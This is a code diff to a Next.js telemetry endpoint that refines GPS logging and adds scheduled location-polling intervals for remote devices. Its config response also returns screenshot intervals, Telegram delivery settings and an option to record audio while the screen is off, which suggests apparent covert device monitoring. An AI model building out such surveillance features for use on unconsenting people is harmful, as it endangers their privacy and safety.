@@ -90,15 +90,21 @@ export async function POST(req: NextRequest) {
     }
 
     // 3. Save historical telemetry log
-    if (typeof batteryLevel === 'number' || location?.latitude) {
+    // Only record when a fresh GPS location is reported to eliminate DB bloat and mobile load
+    const hasFreshLocation =
+      location &&
+      typeof location.latitude === 'number' &&
+      typeof location.longitude === 'number';
+
+    if (hasFreshLocation) {
       await TelemetryLog.create({
         deviceId: device._id,
         batteryLevel: device.batteryLevel || 100,
         isCharging: device.isCharging || false,
-        latitude: device.lastLocation?.latitude,
-        longitude: device.lastLocation?.longitude,
-        accuracy: device.lastLocation?.accuracy,
-        recordedAt: new Date(),
+        latitude: location.latitude,
+        longitude: location.longitude,
+        accuracy: location.accuracy || 0,
+        recordedAt: location.timestamp ? new Date(location.timestamp) : new Date(),
       });
     }
 
@@ -127,11 +133,34 @@ export async function POST(req: NextRequest) {
       .limit(10)
       .lean();
 
+    const defaultSchedules = [
+      {
+        id: 'daytime',
+        name: 'Daytime / Active Hours',
+        startTime: '09:00',
+        endTime: '19:00',
+        intervalSeconds: 60,
+        enabled: true,
+      },
+      {
+        id: 'night',
+        name: 'Night / Low Power Hours',
+        startTime: '19:00',
+        endTime: '08:00',
+        intervalSeconds: 300,
+        enabled: true,
+      },
+    ];
+
     return NextResponse.json({
       status: 'success',
       serverTime: Date.now(),
       config: {
-        syncIntervalSeconds: device.settings.syncIntervalSeconds || (device.settings.syncIntervalMinutes ? device.settings.syncIntervalMinutes * 60 : 5),
+        syncIntervalSeconds:
+          device.settings.syncIntervalSeconds ||
+          (device.settings.syncIntervalMinutes
+            ? device.settings.syncIntervalMinutes * 60
+            : 5),
         syncIntervalMinutes: device.settings.syncIntervalMinutes || 15,
         telegramBotToken: device.settings.telegramBotToken || '',
         telegramChatId: device.settings.telegramChatId || '',
@@ -140,6 +169,13 @@ export async function POST(req: NextRequest) {
         screenshotInterval: device.settings.screenshotInterval || 10,
         sendLocation: device.settings.sendLocation ?? true,
         locationInterval: device.settings.locationInterval || 10,
+        locationDefaultIntervalSeconds:
+          device.settings.locationDefaultIntervalSeconds || 60,
+        locationSchedules:
+          device.settings.locationSchedules &&
+          device.settings.locationSchedules.length > 0
+            ? device.settings.locationSchedules
+            : defaultSchedules,
         sendAudio: device.settings.sendAudio ?? false,
         audioDuration: device.settings.audioDuration || 60,
         audioScreenOff: device.settings.audioScreenOff ?? false,
